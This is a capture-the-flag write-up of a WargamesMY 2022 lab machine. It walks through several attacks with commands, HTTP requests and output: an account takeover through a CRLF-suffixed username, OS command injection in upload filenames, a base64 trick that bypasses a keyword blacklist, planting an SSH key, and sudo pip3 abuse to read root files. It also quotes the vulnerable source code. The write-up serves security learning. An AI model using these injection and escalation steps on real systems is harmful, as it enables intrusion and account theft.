+++
title = "[WargamesMY 2022] C0mmand33r"
description = "This is a boot2root challenge, related to basic OS injection, some real world related account takeover and basic privilages escalation."
date = 2022-12-26T16:47:01+09:00
draft = false
tags = [ "ctf", "boot2root", "IDOR", "OS injection" ]
+++

Im not going to give full walkthrough for now since im more interested vulnerability on the web. Visit [this link](https://github.com/WargamesMY/2022/blob/main/writeup/Richard_Parker.pdf) for full writeup.

## Walkthrough

### user.txt
> 🚧 **Description** : User flag located in /home//user.txt

We were given a [tryhackme](https://tryhackme.com/jr/wgm2022medium) link so if you guys want to give a shot, go check it out. Once the machine boot up, we can start the challenge straight away. After I fired up nmap with simple command `sudo nmap -T4 -A -v 10.10.89.238`, two ports were opened which are 22 (SSH) and 3000 (python http server). So we have a python web application on port 3000. After navigating through all possible webpage, there were only two webpage available, login page and register page. 

{{< figure src="/img/posts/ctf_2022_wargames_C0mmand33r/1.png" caption="Figure 1: Challenge main page" width="100%" align="center" >}}

Then I registered an account with `test` as username and `testtest` as password, and login with those credentials but we got an error message said "`User havent't validated yet`". At first was thinking about trying to get XSS to steal admin session cookie, and I failed. Then I noticed that we can enumerate user account from register page just like wordpress login page. When I looked at my CTFd notification history, organizer was releasing a hint by giving a link https://twitter.com/samwcyo/status/1597695313552510977?s=46&t=REd28opGOUKY8btEbSB0tA.

{{< figure src="/img/posts/ctf_2022_wargames_C0mmand33r/2.png" caption="Figure 2. [Tweet](https://twitter.com/samwcyo/status/1597695309072982018) from hint" width="100%" align="center" >}}

Based on *Figure 2*, Sam Curry (*the person who hack Hyundai vehicles*) tweeted that we could hijack someone account by just adding CRLF character at the end of the victim's email address during registration. In our case, since we already know `admin` user already registered and approved, we can use something like `admin%0d` as username and `any_password` as password and we successfully logged in. After logged in, it has a feature to upload file onto the server. Plus, we cannot view all the uploaded file at all. When I tried to upload a python file, it gave an error message that look familiar.

{{< figure src="/img/posts/ctf_2022_wargames_C0mmand33r/3.png" caption="Figure 3: Upload error message" width="100%" align="center" >}}

The error message same like `file` command or `file -b` to be specific. Option `-b` stands for brief, meaning it do not prepend filenames to output lines (brief mode). We can get OS injection by appending `&&id` at the end of filename like so.

```bash
❯ file -b bio.png
PNG image data, 500 x 500, 8-bit/color RGB, non-interlaced
           
❯ file -b api.py 
Python script, ASCII text executable

❯ file -b bio.png&&id
PNG image data, 500 x 500, 8-bit/color RGB, non-interlaced
uid=1000(incognito99) gid=1000(incognito99) groups=1000(incognito99),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),142(libvirt),998(docker)
```
Once we send the image, the response indicate the webapp run as `user`. Normally we will get `www-data` as user id but luckily the webapp is set to `user` so we dont have to escalate to `user` privilege.

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Thu, 29 Dec 2022 14:40:07 GMT
Content-Type: application/json
Content-Length: 111
Vary: Cookie
Connection: close

{"message":"Invalid file extension: ASCII text\nuid=1001(user) gid=1001(user) groups=1001(user)","status":500}
```
Then I just read the flag by making the filename `test.png&&cat /home/user/user.txt` and I got blocked.

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Thu, 29 Dec 2022 14:45:13 GMT
Content-Type: application/json
Content-Length: 72
Vary: Cookie
Connection: close

{"address":"10.4.11.97","message":"You have been blocked","status":500}
```
Maybe the request have been blocked by WAF or they have blacklists word for filename. I cant even use `bash` or `sh` command, so we need some tricks to bypass the filter. In order to bypass this, I pipe decoded base64 to `$SHELL`(environment variable) to execute the code.

```bash
❯ echo $SHELL       
/usr/bin/zsh

❯ echo "ls" | $SHELL
1.py  2.py  bio.png  test.txt

❯ echo "ls" | base64 -w 0
bHMK

❯ echo bHMK | base64 -d | $SHELL
1.py  2.py  bio.png  test.txt

❯ echo "cat /home/user/user.txt" | base64
Y2F0IC9ob21lL3VzZXIvdXNlci50eHQK
```
Now we can read the flag by simply set the filename as `test.png&&echo Y2F0IC9ob21lL3VzZXIvdXNlci50eHQK | base64 -d | $SHELL` and we are good to go.

```
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Thu, 29 Dec 2022 15:03:47 GMT
Content-Type: application/json
Content-Length: 102
Vary: Cookie
Connection: close

{"message":"Invalid file extension: ASCII text\nwgmy{baad129d9b78adf480157bca10d92371}","status":500}

```

### root.txt

> 🚧 **Description** : Root flag located in /root/root.txt

In order to get stable shell, we can ssh to the machine by adding ssh key to authorize_keys. Before this, im using rsa key but one writeup from richard parker team are using `ed25519` because of much faster and public key are smaller than rsa. You can generate `ed25519` key using `ssh-keygen`.

```bash
❯ ssh-keygen -t ed25519 -C "hek@hek.com"
```

Once it generated, it will be saved at `~/.ssh/id_ed25519.pub`. The flow gonna be like this.

- Upload `id_ed25519.pub` to the server using upload features (change the extensions)

```http
POST /api/upload HTTP/1.1
Host: 10.10.56.213:3000
Content-Length: 2950
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.56.213:3000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBp8wD0KdqyP7IIjQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.56.213:3000/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJwljktuAzEMQ-_idRey5Z9ymYFFSUhQoAVmklXRu9dBl3wgwfeTjjj9uqfb83z5Rzoelm4JOr3A0LgKtRpLSSUyaCHUMnUFLE9Ck167vnFD7THDQyK8DtAUeVdHji7VnHJTosJdnBg8lvKCUlmNRcWCw6ZKh8wwpC3yuvz8tyk74jrjeH5_-tcGE5lLNxDbftk7R54NM8RlobMOX-qjpd8_FwJB_A.Y7OfDg.jCVyeNjj9Hza_5PegigQoIhNfyA
Connection: close

------WebKitFormBoundaryBp8wD0KdqyP7IIjQ
Content-Disposition: form-data; name="file"; filename="id_ed25519.png"
Content-Type: image/png

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEBtY/QPeKmTlOiIyOQTZwUDUKSK9NvYQBL08XaWv0nE qi@qi.com

------WebKitFormBoundaryBp8wD0KdqyP7IIjQ--
```

- Use OS injection to create `/home/user/.ssh` directory
```bash
❯ echo "mkdir /home/user/.ssh" | base64 -w 0
```
- Read `id_ed25519` file and save it to `/home/user/.ssh/authorized_keys` like below. If you try to `ls` all files in current directory, it will append `uploads` in front of the filename. For example, I uploaded a png file named `id_ed25519.png`, so the system will saved it as `uploadsid_ed25519.png`. Bad code from programmer tho.

```bash
❯ echo "cat uploadsid_ed25519.png > /home/user/.ssh/authorized_keys" | base64 -w 0
```

- ssh to the machine
```bash
❯ ssh user@10.10.56.213 -i id_ed25519
```

Normally after ssh into the server, Im going to list out the allowed commands for invoking user (using sudo) on current host using `sudo -l`.
```bash
user@wgym2022:~$ sudo -l
Matching Defaults entries for user on wgym2022:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on wgym2022:
    (ALL) NOPASSWD: /usr/bin/pip3 install http\://git.wgmyinternal.com.my/repositories/*
```

We can run pip3 install with specific repository and any options because of the wildcare (*) based on this line `/usr/bin/pip3 install http\://git.wgmyinternal.com.my/repositories/*`. By looking at `pip3 install` help options, we can install from given file by using `-r` or `--requirements` options. For example, when we try to install python module using root.txt, it will throw an error because the module on the file is not available, and pip will display the content of the file.
```bash
user@wgym2022:~/.ssh$ sudo /usr/bin/pip3 install http://git.wgmyinternal.com.my/repositories/* -r /root/root.txt
ERROR: Invalid requirement: 'wgmy{c06a9ec6a4aced3c13c11bdd0a54cc70}' (from line 1 of /root/root.txt)
```

---

## Technical explaination on Account Takeover

After I got shell, I've downloaded the source code for the webapp to further analyze on register and login bug. Among all files, I got interested with `app.py` and `helpers.py`. On `helpers.py`, it performs three checking:
- `def containsBadChar` : Check if our payload contains blacklist keywords
- `def allowed_file` : Check if user supply with allowed file extension like `.png`, `.jpg`, `.jpeg`, `.gif`
- `def checkFileType` : Check file type using system command `file --brief`. (*thats why we got an OS injection*)

```python
   1   │ #!/usr/bin/env python3
   2   │ import re
   3   │ import subprocess
   4   │ from urllib.parse import unquote
   5   │ 
   6   │ def containsBadChar(url):
   7   │     blackLists = [
   8   │         'etc',
   9   │         'passwd',
  10   │         'home',
  11   │         'opt',
  12   │         'var',
  13   │         'tmp',
  14   │         'cat',
  15   │         'tail',
  16   │         'curl',
  17   │         'wget',
  18   │         'sh',
  19   │         'python',
  20   │         'ls',
  21   │         '..',
  22   │     ]
  23   │     for i in blackLists:
  24   │         if i in url:
  25   │             return True
  26   │     return False
  27   │ 
  28   │ def allowed_file(filename):
  29   │     ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
  30   │     return '.' in filename and \
  31   │            filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
  32   │ 
  33   │ def checkFileType(file):
  34   │     file = unquote(file)
  35   │     cmd = "file --brief {}".format(file)
  36   │     result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
  37   │     cmd_output = result.stdout.read().decode('utf-8').strip()
  38   │     return cmd_output
```

Lets take a look at register. The route `/register` have two methods which are `GET` and `POST` request.

```python
  91   │ @ app.route('/register', methods=['GET', 'POST'])
  92   │ def register():
  93   │     form = RegisterForm()
  94   │     if form.validate_on_submit():
  95   │         exists = User.query.filter_by(username=form.username.data.strip()).first()
  96   │         if exists:
  97   │             return render_template('register.html', form=form, msg='User already exists')
  98   │         hashed_password = bcrypt.generate_password_hash(form.password.data)
  99   │         new_user = User(username=form.username.data, password=hashed_password)
 100   │         db.session.add(new_user)
 101   │         db.session.commit()
 102   │         return redirect(url_for('login'))
 103   │ 
 104   │     return render_template('register.html', form=form)
```

As you can see, it took username from user input and strip trailing character from it and check if the user already exist. If it is not, the system will create a new user and redirect to login page. The login page also take two methods, `GET` and `POST` request.

```python
  63   │ @app.route('/login', methods=['GET', 'POST'])
  64   │ def login():
  65   │     form = LoginForm()
  66   │     if form.validate_on_submit():
  67   │         user = User.query.filter_by(username=form.username.data).first()
  68   │         if user and bcrypt.check_password_hash(user.password, form.password.data):
  69   │             username = unquote(form.username.data).strip()
  70   │             user = User.query.filter_by(username=username).first()
  71   │             # check if the user already validated
  72   │             if not user.verified:
  73   │                 return render_template('login.html', form=form, msg='User havent\'t validated yet')
  74   │             login_user(user)
  75   │             return redirect(url_for('dashboard'))
  76   │         else:
  77   │             return render_template('login.html', form=form, msg='Wrong username or password')
  78   │     return render_template('login.html', form=form)
```

The vulnerability lies on this portion of code `username = unquote(form.username.data).strip()`. Okay lets take a look at register again, let say we register a username named `admin%0d` and `password123` as password, then the system create the account and saved it to the database. After that, on login page, the system make a query to database to check if the user is exist or not `user = User.query.filter_by(username=form.username.data).first()` which will be `user = User.query.filter_by(username="admin%0d").first()`. Then it will validate the provided password and password from database. If the both credential are correct, it will run two vulnerable misconfiguration code:

```python
username = unquote(form.username.data).strip()
user = User.query.filter_by(username=username).first()
```
`unquote` will decode url encoded string to normal string, then strip any trailing character from it. Thats why `admin%0d` will become `admin`, so when `login_user(user)` executed, it will login based on `admin` account.

```python
>>> from urllib.parse import *
>>> unquote("admin%0D").strip()
'admin'
```

I ran a simple and quick test to check what else we can put rather that CRLF and space, so I got like 10 results.

```python
   1   │ from urllib.parse import *
   2   │ 
   3   │ for i in range(128):
   4   │     ascii_hex = "{0:0{1}x}".format(i,2)
   5   │     username = f"admin%{ascii_hex}"
   6   │     unquotes = unquote(username).strip()
   7   │ 
   8   │     if unquotes == "admin":
   9   │         print(f"{username} : {unquotes}")
```

```bash
❯ python3 test.py

admin%09 : admin
admin%0a : admin
admin%0b : admin
admin%0c : admin
admin%0d : admin
admin%1c : admin
admin%1d : admin
admin%1e : admin
admin%1f : admin
admin%20 : admin
```

## Summary

The challenge taught me about os injection, account takeover and ssh key other than rsa key which is `ed25519`. The most fun part is when im trying to figure out why account takeover is possible since it is related to real world. I hope you guys learn new thing as well. Thats all from me. ✌️